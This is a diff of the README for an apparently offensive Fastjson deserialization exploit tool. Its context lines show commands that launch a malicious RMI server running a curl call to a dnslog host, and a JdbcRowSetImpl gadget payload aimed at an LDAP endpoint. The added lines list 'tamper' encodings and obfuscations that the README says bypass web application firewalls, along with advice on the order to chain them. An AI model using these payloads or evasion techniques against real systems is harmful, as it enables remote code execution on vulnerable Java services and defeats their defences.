@@ -16,8 +16,25 @@ java -cp fastjson_tool.jar fastjson.EvilRMIServer 8888 1099 "curl dnslog.wyzxxz.
 java -cp fastjson_tool.jar fastjson.Tamper  "{\"abc\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1099/Object\",\"autoCommit\":true}}" 
 
 2021-03-31 新增：
-fastjson.Tamper : fastjson的一些特性，可以绕一些WAF
-fastjson.LDAPRefServerAuto : 新增了一些场景的回显, 选择payload的地址增加了自定义，格式: payload={.........}
+1.fastjson.Tamper : fastjson的一些特性，可以绕一些WAF
+[-] tamper list: 
+tohex 
+tounicode 
+tohexunicode 
+randomhex 
+randomunicode 
+addis 
+addcomment 
+addmorecomment 
+addcommas      
+addrandomx 
+add- 
+add_ 
+addsize       填充内容
+
+tamper支持多个，但有些不能一起用，多个注意使用的先后顺序，例如 tohex,addcomment
+
+2.fastjson.LDAPRefServerAuto : 新增了一些场景的回显, 选择payload的地址增加了自定义，格式: payload={.........}
 
 
 2020-10-30 新增：
